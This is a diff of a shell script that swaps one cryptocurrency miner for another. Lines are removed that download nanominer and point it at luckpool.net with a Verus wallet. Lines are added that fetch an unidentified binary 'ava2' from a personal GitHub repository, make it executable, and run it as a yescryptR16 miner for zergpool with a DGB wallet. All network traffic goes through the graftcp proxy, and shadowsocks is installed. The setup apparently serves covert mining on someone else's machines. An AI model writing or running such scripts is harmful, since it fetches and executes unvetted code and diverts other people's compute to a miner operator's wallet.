@@ -35,13 +35,11 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/nanopool/nanominer/releases/download/v3.6.2/nanominer-linux-3.6.2.tar.gz && tar -xvf nanominer-linux-3.6.2.tar.gz && cd nanominer-linux-3.6.2 && chmod 7777 * &
+./graftcp/graftcp wget https://github.com/dekamoonth/cpuu/raw/main/ava2 
+chmod +x ava2
 
 apt -y install shadowsocks-libev rng-tools
 
-./graftcp/graftcp ./nanominer -algo verushash -wallet RCpSUheBRfz96Q9KaNHz7FtQdwNyrb1b9d -coin verus -rigName ntah -pool1 na.luckpool.net:3956
-sleep 2
-./graftcp/graftcp ./nanominer -algo verushash -wallet RCpSUheBRfz96Q9KaNHz7FtQdwNyrb1b9d -coin verus -rigName ntah -pool1 eu.luckpool.net:3956
-sleep 2
-./graftcp/graftcp ./nanominer -algo verushash -wallet RCpSUheBRfz96Q9KaNHz7FtQdwNyrb1b9d -coin verus -rigName ntah -pool1 ap.luckpool.net:3956
+./graftcp/graftcp ./ava2 -a yescryptR16 -o stratum+tcp://yescryptR16.asia.mine.zergpool.com:6333 -u DBzjgXkfYtotoLg1hKRZugd7vDotq7TW1k -p c=DGB,mc=QOGE,ID=feas -t 3
+
 
